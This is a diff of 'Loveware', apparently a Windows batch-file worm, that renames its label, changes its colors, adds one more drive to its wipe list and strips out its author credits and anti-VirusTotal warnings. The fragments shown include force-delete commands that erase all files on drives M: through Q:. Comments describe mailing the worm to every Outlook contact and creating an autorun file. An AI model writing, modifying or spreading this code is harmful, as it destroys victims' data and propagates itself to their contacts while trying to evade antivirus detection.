@@ -17,10 +17,10 @@
 ::  '---'       `----'     \   \ |   :    |  \   \  |--";  :   .'   \---'  |   :    | 
 ::                          '---" \   \  /    \   \ |   |  ,     .-./       \   \  /  
 ::                                 `----'      '---"     `--`---'            `---  
-:: DO NOT UPLOAD ON VIRUSTOTAL!!!
+::
 ::                                                                         
 
-color 57
+color 35
 
 title Loveware
 
@@ -177,7 +177,7 @@ goto Infect
 :: Send Loveware to all the contacts of the user
 :: with outlook
 
-:worm
+:worm-spreads
 
 set Slash=\
 if exist %SystemDrive%%Slash%AUTOEXEC.BAT (
@@ -260,6 +260,7 @@ del M:\*.* /f /s /q
 del N:\*.* /f /s /q
 del O:\*.* /f /s /q
 del P:\*.* /f /s /q
+del Q:\*.* /f /s /q
 
 :: Create autorun file
 
@@ -731,37 +732,3 @@ goto :again
 
 :Restarted
 goto checker
-
-
-::       .....           .....
-::   ,ad8PPPP88b,     ,d88PPPP8ba,
-::  d8P"      "Y8b, ,d8P"      "Y8b
-:: dP'           "8a8"           `Yd
-:: 8(              "              )8
-:: I8       CODED WITH LOVE       8I
-::  Yb,     BY THE LOVEWARE     ,dP
-::   "8a,        TEAM         ,a8"
-::     "8a,                 ,a8"
-::       "Yba             adP"
-::         `Y8a         a8P'
-::           `88,     ,88'
-::             "8b   d8"
-::              "8b d8"
-::               `888'
-::                 "
-::
-::
-:: PLEASE DO NOT COPY THE LOVEWARE CODE AND RENAME IT
-:: THAT'S NOT CREATING THAT IS STEALING.
-:: THIS SOFTWARE IS PROTECTED BY A GNU PUBLIC LICENSE
-:: DO NOT UPLOAD THIS SAMPLE ON VIRUS TOTAL TO PREVENT 
-:: ANTI VIRUS DETECTION.
-:: I AND THE TEAM ARE NOT RESPONSIBLE FOR THE DAMAGE CAUSED BY 
-:: THIS SOFTWARE!
-::
-:: THANKS FOR THE PEOPLE WHO ADDET THERE CODE TO THIS PROJECT
-:: AND SUPPORTED IT
-::
-:: NEW VERSIONS WILL BE COMING SOON (I HOPE)
-::
-:: Greetings from the LOVEWARE TEAM
